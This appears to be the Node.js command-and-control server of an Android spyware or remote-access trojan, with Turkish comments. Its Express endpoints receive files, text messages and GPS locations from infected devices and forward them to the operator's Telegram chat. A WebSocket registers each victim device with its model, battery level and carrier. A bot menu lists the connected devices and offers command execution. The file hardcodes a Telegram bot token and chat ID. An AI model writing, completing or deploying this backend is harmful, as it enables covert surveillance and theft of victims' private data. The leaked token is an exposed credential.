const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");

// --- AYARLAR ---
const token = '8769587003:AAGs-hiLOjifiHKv4XMK628LT43TjPtp8SU';
const id = '8788868439';
const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const appBot = new telegramBot(token, { polling: true });
const appClients = new Map();

const upload = multer();
app.use(bodyParser.json());

let currentUuid = '';
let currentNumber = '';
let currentTitle = '';

app.get('/', (req, res) => {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>');
});

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname;
    appBot.sendDocument(id, req.file.buffer, {
        caption: `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`,
        parse_mode: "HTML"
    }, { filename: name, contentType: 'application/txt' });
    res.send('');
});

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• 𝙈𝙚𝙨𝙨𝙖𝙜𝙚 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚\n\n` + req.body['text'], { parse_mode: "HTML" });
    res.send('');
});

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon']);
    appBot.sendMessage(id, `°• 𝙇𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙛𝙧𝙤𝙢 <b>${req.headers.model}</b> 𝙙𝙚𝙫𝙞𝙘𝙚`, { parse_mode: "HTML" });
    res.send('');
});

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4();
    ws.uuid = uuid;
    const model = req.headers.model;
    const battery = req.headers.battery;
    const version = req.headers.version;
    const brightness = req.headers.brightness;
    const provider = req.headers.provider;

    appClients.set(uuid, { model, battery, version, brightness, provider });
    appBot.sendMessage(id, `°• 𝙉𝙚𝙬 𝙙𝙚𝙫𝙞𝙘𝙚 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n• ᴅᴇᴠɪᴄᴇ : <b>${model}</b>`, { parse_mode: "HTML" });

    ws.on('close', () => {
        appBot.sendMessage(id, `°• 𝘿𝙚𝙫𝙞𝙘𝙚 𝙙𝙞𝙨𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙\n\n• ᴅᴇᴠɪᴄᴇ : <b>${model}</b>`, { parse_mode: "HTML" });
        appClients.delete(ws.uuid);
    });
});

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (id != chatId) return; // Sadece senin ID'ne cevap verir

    if (message.reply_to_message) {
        const replyText = message.reply_to_message.text;
        if (replyText.includes('𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧')) {
            currentNumber = message.text;
            appBot.sendMessage(id, '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚', { reply_markup: { force_reply: true } });
        }
        // ... Diğer reply kontrolleri buraya gelecek (Kısalttım, parantez hatası olmaması için yukarıdaki mantıkla devam et)
    }

    if (message.text == '/start') {
        appBot.sendMessage(id, '°• 𝙃𝙚𝙡𝙡𝙤 𝙎𝙞𝙧 😎', {
            reply_markup: {
                keyboard: [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                resize_keyboard: true
            }
        });
    }

    if (message.text == '𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨') {
        if (appClients.size == 0) {
            appBot.sendMessage(id, '°• 𝙉𝙤 𝙙𝙚𝙫𝙞𝙘𝙚𝙨');
        } else {
            let text = '°• 𝙇𝙞𝙨𝙩 :\n\n';
            appClients.forEach(v => { text += `• ${v.model}\n`; });
            appBot.sendMessage(id, text, { parse_mode: "HTML" });
        }
    }
});

// --- RENDER PORT DİNLEME (EN ÖNEMLİ KISIM) ---
const PORT = process.env.PORT || 3000;
appServer.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
  
